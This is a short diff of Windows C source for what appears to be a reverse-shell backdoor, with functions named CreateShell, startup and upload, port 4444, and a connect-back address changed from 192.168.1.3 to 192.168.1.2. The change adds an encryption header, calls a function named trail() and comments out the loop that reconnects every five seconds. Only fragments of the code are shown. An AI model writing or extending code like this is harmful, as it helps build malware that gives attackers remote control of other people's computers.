@@ -5,9 +5,10 @@
 #include<process.h>
 #include<io.h>
 #include "helper.h"
+#include "encryption.h"
 #define DEFAULT_BUFLEN 2048
 
-#pragma comment(lib, "ws2_32.lib")
+#pragma comment(lib, "ws2_32.lib") //for dynamically linked library
 #pragma warning(disable:4996) 
 void CreateShell(int port);
 int startup();
@@ -16,6 +17,8 @@ void upload();
 int port = 4444;
 SOCKET sockt; //global sockt
 int main() {
+	trail();
+	/*
 	while (TRUE) {
 		//search for connection every 5 seconds
 		Sleep(5000);
@@ -47,6 +50,7 @@ int main() {
 		}
 	
 	}
+	*/
 	return 0;
 }  
 void CreateShell(int port) {
@@ -86,7 +90,7 @@ int startup() {
 
 	revsockaddr.sin_family = AF_INET;
 	revsockaddr.sin_port = htons(port);
-	revsockaddr.sin_addr.s_addr = inet_addr("192.168.1.3");
+	revsockaddr.sin_addr.s_addr = inet_addr("192.168.1.2");
 
 	printf("\nsocket created ");
 
